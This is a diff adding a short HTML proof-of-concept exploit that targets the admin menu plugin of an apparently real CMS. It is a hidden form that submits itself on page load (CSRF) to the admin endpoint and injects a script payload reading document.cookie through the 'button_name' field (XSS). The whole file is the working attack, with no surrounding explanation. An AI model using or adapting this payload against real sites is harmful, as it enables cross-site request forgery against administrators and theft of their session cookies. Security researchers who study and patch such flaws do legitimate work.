@@ -1,0 +1,10 @@
+&lt;form action=&quot;http://www.example.com/admin/plugin.php?menu_id=1&module=menu&plitem=modmenu.php&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;module&quot; value=&quot;menu&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;plitem&quot; value=&quot;modmenu.php&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_id&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;button_name&quot; value='bn&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;new_make&quot; value=&quot;YES&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
